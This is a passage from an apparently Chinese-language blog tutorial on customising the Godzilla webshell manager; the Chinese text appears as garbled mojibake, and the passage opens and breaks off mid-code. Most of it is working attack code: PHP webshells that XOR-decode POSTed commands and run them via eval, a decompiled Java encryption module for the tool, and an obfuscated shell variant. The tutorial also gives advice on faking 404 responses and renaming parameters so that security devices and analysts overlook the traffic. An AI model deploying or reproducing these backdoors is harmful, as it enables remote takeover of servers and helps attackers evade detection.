class="variable">$pass</span>=<span class="string">&#x27;pass&#x27;</span>;</span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;3c6e0b8a9c15224a&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=encode(base64_decode(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]),<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;</span><br><span class="line">        <span class="variable">$payload</span>=encode(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$payload</span>=encode(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line">      <span class="comment">//  echo substr(md5($pass.$key),0,16);</span></span><br><span class="line">       <span class="comment">// echo base64_encode(encode(@run($data),$key));</span></span><br><span class="line">        <span class="comment">//echo substr(md5($pass.$key),16);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#123;\&quot;message\&quot;:\&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(encode(@run(<span class="variable">$data</span>),<span class="variable">$key</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=encode(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918142827258.png" alt="image-20240918142827258"></p><p>å¥½ï¼Œåœ¨çœ‹ä¸‹æµé‡</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918143005096.png" alt="image-20240918143005096"></p><p>è¿”å›åŒ…</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918143036780.png" alt="image-20240918143036780"></p><p>å˜¿ï¼Œæ˜¯ä¸æ˜¯æœ‰é‚£å‘³äº†ã€‚</p><p>åœ¨phpä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è®©è¿”å›åŒ…å¼ºåˆ¶404ï¼Œåªéœ€åœ¨ğŸé‡Œé¢æ·»åŠ http_response_code(404);å³å¯</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918143259838.png" alt="image-20240918143259838"></p><p>é¡ºä¾¿æˆ‘æŠŠpassæ”¹æˆäº†searchï¼Œè¿™æ ·å†çœ‹ä¸‹æ•°æ®åŒ…ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918143443763.png" alt="image-20240918143443763"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918144818071.png" alt="image-20240918144818071"></p><p>è¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬çš„æµé‡çŠ¶æ€ç å°±æ˜¯404äº†ï¼Œæ˜¯ä¸æ˜¯çŒ›ä¸€çœ‹ï¼Œè¿˜çœŸä¸å¥½åˆ†è¾¨ï¼Œå¦‚æœæ˜¯æ–°æ‰‹çš„è¯ï¼Œå¯èƒ½çœ‹è®¾å¤‡çš„æ—¶å€™éƒ½ç›´æ¥ç•¥è¿‡ç‚¹è¯¯æŠ¥äº†ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918145047876.png" alt="image-20240918145047876"></p><p>å½“ç„¶ï¼Œä½ å¯ä»¥æ”¹æˆä»»ä½•ä½ å–œæ¬¢çš„æ•°å­—ã€‚</p><p>å‘é€åŒ…çš„pass å› ä¸ºæ˜¯ä¼ é€’é”®ï¼Œæ‰€ä»¥æˆ‘å»ºè®®ç”Ÿæˆçš„æ—¶å€™ï¼Œè¿˜æ˜¯ç”¨ä¸€äº›å•è¯ï¼Œè¿™æ ·æ›´æœ‰è¿·æƒ‘æ€§ã€‚</p><p>è¿”å›å€¼è¿™ä¸ªfL1tMGI4YTljæœ‰çš„å®‰å…¨è®¾å¤‡ï¼Œä¹Ÿè¢«å®šä¹‰ä¸ºå±é™©å­—ç¬¦ï¼Œå› ä¸ºè¿”å›å€¼è¦å¼‚æˆ–keyï¼Œæ‰€ä»¥keyåœ¨ç”Ÿæˆçš„æ—¶å€™ä¹Ÿä¸èƒ½ç”¨é»˜è®¤ï¼Œç®€å•æ”¹ä¸€æ”¹ã€‚</p><p>okåšæˆè¦åšå…¨å¥—ï¼Œæˆ‘ä»¬ä¸èƒ½æ¯æ¬¡ç”¨çš„æ—¶å€™éœ€è¦ï¼Œæ¥åˆ°æ–‡ç« æ‹¿ä»£ç ï¼Œgodzillaä¹Ÿæ˜¯å¥½ç”¨åœ¨è¿™é‡Œã€‚ç›´æ¥å·¥å…·ä¸­ç”Ÿæˆï¼Œå¯¹æˆ‘è¿™ç§èŒæ–°æ¯”è¾ƒå‹å¥½ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ¥çœ‹æ€ä¹ˆåœ¨godzillaä¸­ç”Ÿæˆæœ¨é©¬ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918145447770.png" alt="image-20240918145447770"></p><p>phpçš„generateçš„ä»£ç ä¸­ç¡®å®šäº†ç”¨åˆ°é‚£ä¸ªbinæ–‡ä»¶ï¼Œ</p><p>åŠ å¯†å™¨ä¸­ä¹Ÿä¼šåˆ¤æ–­isbin?ï¼Œé‚£æˆ‘ä»¬ä»¿ç…§evalçš„åŠ å¯†å™¨å†™ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918145651220.png" alt="image-20240918145651220"></p><p>ç›´æ¥å®šæ­»æˆ–è€…binæ–‡ä»¶å³å¯ã€‚</p><p>åˆ›å»ºæ–‡ä»¶ï¼Œæ ¼å¼å¯¹é½ã€‚åˆ«å†™é”™äº†ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918145837517.png" alt="image-20240918145837517"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918151810623.png" alt="image-20240918151810623"></p><p>æœ€ä¸‹é¢æ”¹ä¸€æ”¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> shells.cryptions.phpXor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> core.annotation.CryptionAnnotation;</span><br><span class="line"><span class="keyword">import</span> core.imp.Cryption;</span><br><span class="line"><span class="keyword">import</span> core.shell.ShellEntity;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> util.Log;</span><br><span class="line"><span class="keyword">import</span> util.functions;</span><br><span class="line"><span class="keyword">import</span> util.http.Http;</span><br><span class="line"></span><br><span class="line"><span class="meta">@CryptionAnnotation(</span></span><br><span class="line"><span class="meta">        Name = &quot;PHP_XOR_BASE64_MESSAGES&quot;,</span></span><br><span class="line"><span class="meta">        payloadName = &quot;PhpDynamicPayload&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PhpXormessage</span> <span class="keyword">implements</span> <span class="title">Cryption</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> ShellEntity shell;</span><br><span class="line">    <span class="keyword">private</span> Http http;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">byte</span>[] key;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> state;</span><br><span class="line">    <span class="keyword">private</span> String pass;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">byte</span>[] payload;</span><br><span class="line">    <span class="keyword">private</span> String findStrLeft;</span><br><span class="line">    <span class="keyword">private</span> String findStrRight;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PhpXormessage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ShellEntity context)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.shell = context;</span><br><span class="line">        <span class="keyword">this</span>.http = <span class="keyword">this</span>.shell.getHttp();</span><br><span class="line">        <span class="keyword">this</span>.key = <span class="keyword">this</span>.shell.getSecretKeyX().getBytes();</span><br><span class="line">        <span class="keyword">this</span>.pass = <span class="keyword">this</span>.shell.getPassword();</span><br><span class="line">        String findStrMd5 = functions.md5(<span class="keyword">this</span>.pass + <span class="keyword">new</span> String(<span class="keyword">this</span>.key));</span><br><span class="line">        <span class="comment">//this.findStrLeft = findStrMd5.substring(0, 16);</span></span><br><span class="line">        <span class="comment">//this.findStrRight = findStrMd5.substring(16);</span></span><br><span class="line">        <span class="keyword">this</span>.findStrLeft = <span class="string">&quot;&#123;\&quot;message\&quot;:\&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">this</span>.findStrRight = <span class="string">&quot;\&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.payload = <span class="keyword">this</span>.shell.getPayloadModule().getPayload();</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.payload != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.http.sendHttpResponse(<span class="keyword">this</span>.payload);</span><br><span class="line">                <span class="keyword">this</span>.state = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Log.error(<span class="string">&quot;payload Is Null&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var4) &#123;</span><br><span class="line">            Exception e = var4;</span><br><span class="line">            Log.error(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] encode(<span class="keyword">byte</span>[] data) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.E(data);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">            Exception e = var3;</span><br><span class="line">            Log.error(e);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] decode(<span class="keyword">byte</span>[] data) &#123;</span><br><span class="line">        <span class="keyword">if</span> (data != <span class="keyword">null</span> &amp;&amp; data.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.D(<span class="keyword">this</span>.findStr(data));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">                Exception e = var3;</span><br><span class="line">                Log.error(e);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> data;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSendRLData</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] E(<span class="keyword">byte</span>[] cs) &#123;</span><br><span class="line">        <span class="keyword">int</span> len = cs.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">            cs[i] ^= <span class="keyword">this</span>.key[i + <span class="number">1</span> &amp; <span class="number">15</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">this</span>.pass + <span class="string">&quot;=&quot;</span> + URLEncoder.encode(functions.base64EncodeToString(cs))).getBytes();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] D(String data) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] cs = functions.base64Decode(data);</span><br><span class="line">        <span class="keyword">int</span> len = cs.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">            cs[i] ^= <span class="keyword">this</span>.key[i + <span class="number">1</span> &amp; <span class="number">15</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> cs;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">findStr</span><span class="params">(<span class="keyword">byte</span>[] respResult)</span> </span>&#123;</span><br><span class="line">        String htmlString = <span class="keyword">new</span> String(respResult);</span><br><span class="line">        <span class="keyword">return</span> functions.subMiddleStr(htmlString, <span class="keyword">this</span>.findStrLeft, <span class="keyword">this</span>.findStrRight);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">check</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.state;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] generate(String password, String secretKey) &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> String(functions.readInputStreamAutoClose(PhpXormessage.class.getResourceAsStream(<span class="string">&quot;template/xorbase64message.bin&quot;</span>)))).replace(<span class="string">&quot;&#123;pass&#125;&quot;</span>, password).replace(<span class="string">&quot;&#123;secretKey&#125;&quot;</span>, functions.md5(secretKey).substring(<span class="number">0</span>, <span class="number">16</span>)).getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åbinæ–‡ä»¶å†™å¥½</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">http_response_code(<span class="number">404</span>);</span><br><span class="line">@session_start();</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;&#123;pass&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;&#123;secretKey&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=encode(base64_decode(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]),<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;</span><br><span class="line">        <span class="variable">$payload</span>=encode(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$payload</span>=encode(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&#123;\&quot;message\&quot;:\&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> base64_encode(encode(@run(<span class="variable">$data</span>),<span class="variable">$key</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=encode(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>okæ‰“åŒ…ç¼–è¯‘ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918153555125.png" alt="image-20240918153555125"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918153824247.png" alt="image-20240918153824247"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918154134027.png" alt="image-20240918154134027"></p><p>okï¼Œè¿™é‡Œæ¼”ç¤ºå·²ç»æ²¡æœ‰é—®é¢˜äº†ï¼Œæˆ‘ä»¬ç›´æ¥åšå…¨ç‚¹ï¼Œ</p><p>ç”¨ä¸€ä¸‹è¿™ä¸ªå¤§å¸ˆå‚…çš„é¡¹ç›®ï¼Œ<a href="https://github.com/Tas9er/ByPassGodzilla">https://github.com/Tas9er/ByPassGodzilla</a></p><p>ç”Ÿæˆä¸€ä¸ªphpçš„ç ï¼Œå°è£…åˆ°é‡Œé¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?pHP</span></span><br><span class="line">@session_start();</span><br><span class="line">@set_time_limit(Chr(<span class="string">&quot;48&quot;</span>));</span><br><span class="line">@error_reporting<span class="comment">/*dbappsecurityCh3yaQPIpr*/</span>(Chr(<span class="string">&quot;48&quot;</span>));</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">qianxingCgkD21wHn</span>(<span class="params"><span class="comment">/*dbappsecurityN05i2v*/</span><span class="variable">$qianxinfImnkp0WMq6TX</span>,<span class="variable">$qianxinGYCCVkSDkVAY</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$qianxinhP</span>=Chr(<span class="string">&quot;48&quot;</span>);<span class="variable">$qianxinhP</span>&lt;strlen(<span class="variable">$qianxinfImnkp0WMq6TX</span>);<span class="variable">$qianxinhP</span>++) &#123;</span><br><span class="line">        <span class="variable">$qianxinqq</span> = <span class="variable">$qianxinGYCCVkSDkVAY</span>[<span class="variable">$qianxinhP</span>+Chr(<span class="string">&quot;49&quot;</span>)&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$qianxinfImnkp0WMq6TX</span>[<span class="variable">$qianxinhP</span>] = <span class="variable">$qianxinfImnkp0WMq6TX</span>[<span class="variable">$qianxinhP</span>]^<span class="variable">$qianxinqq</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$qianxinfImnkp0WMq6TX</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$qianxinITUfjjXmxo2</span> = <span class="string">&quot;bas&quot;</span>.<span class="string">&quot;e6&quot;</span>.Chr(<span class="string">&quot;52&quot;</span>).<span class="string">&quot;_&quot;</span>.<span class="string">&quot;de&quot;</span>.<span class="string">&quot;cod&quot;</span>.Chr(<span class="string">&quot;101&quot;</span>);</span><br><span class="line"><span class="variable">$base64_qianxingCgkD21wHn</span> = <span class="string">&quot;bas&quot;</span>.<span class="string">&quot;e6&quot;</span>.Chr(<span class="string">&quot;52&quot;</span>).<span class="string">&quot;_e&quot;</span>.Chr(<span class="string">&quot;110&quot;</span>).Chr(<span class="string">&quot;99&quot;</span>).<span class="string">&quot;ode&quot;</span>;</span><br><span class="line"><span class="variable">$qianxinw7hJzkKxyi</span>=<span class="string">&#x27;&#123;pass&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$qianxinuMq5P9IAtT1AwU</span>=<span class="string">&#x27;p&#x27;</span>.<span class="variable">$qianxinITUfjjXmxo2</span>(<span class="variable">$qianxinITUfjjXmxo2</span>(<span class="string">&quot;WVhsc2IyRms=&quot;</span>));</span><br><span class="line"><span class="variable">$qianxin1B</span>=<span class="string">&#x27;&#123;secretKey&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span><span class="comment">/*dbappsecurityQikjH7TyvFiC5K*/</span>[<span class="variable">$qianxinw7hJzkKxyi</span>]))&#123;</span><br><span class="line">    <span class="variable">$datqianxin7mlwRjVMRy1A</span>=qianxingCgkD21wHn<span class="comment">/*dbappsecurityKdu4owvmY*/</span>(<span class="variable">$qianxinITUfjjXmxo2</span>(<span class="variable">$_POST</span>[<span class="variable">$qianxinw7hJzkKxyi</span>]),<span class="variable">$qianxin1B</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="comment">/*dbappsecuritybmIrEvG*/</span><span class="keyword">isset</span>(<span class="variable">$_SESSION</span><span class="comment">/*dbappsecurityJrZYGpRm*/</span>[<span class="variable">$qianxinuMq5P9IAtT1AwU</span>]))&#123;</span><br><span class="line">        <span class="variable">$qianxinqN</span>=qianxingCgkD21wHn(<span class="variable">$_SESSION</span><span class="comment">/*dbappsecurityqdVXl3Fu4*/</span>[<span class="variable">$qianxinuMq5P9IAtT1AwU</span>],<span class="variable">$qianxin1B</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="comment">/*dbappsecurityZIDeNEw*/</span>strpos(<span class="variable">$qianxinqN</span>,<span class="variable">$qianxinITUfjjXmxo2</span><span class="comment">/*dbappsecuritySC9ERptWGKU*/</span>(<span class="variable">$qianxinITUfjjXmxo2</span>(<span class="string">&quot;WjJWMFFtRnphV056U1c1bWJ3PT0=&quot;</span>)))===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$qianxinqN</span>=qianxingCgkD21wHn<span class="comment">/*dbappsecurityt9vgwbR6Nu*/</span>(<span class="variable">$qianxinqN</span>,<span class="variable">$qianxin1B</span>);</span><br><span class="line">        &#125;</span><br><span class="line">                define(<span class="string">&quot;qianxinhRs0Ff&quot;</span>,<span class="string">&quot;//qianxinUJEoZGk\r\n&quot;</span>.<span class="variable">$qianxinqN</span>);</span><br><span class="line">                <span class="keyword">eval</span>(qianxinhRs0Ff);</span><br><span class="line">                                <span class="keyword">echo</span> <span 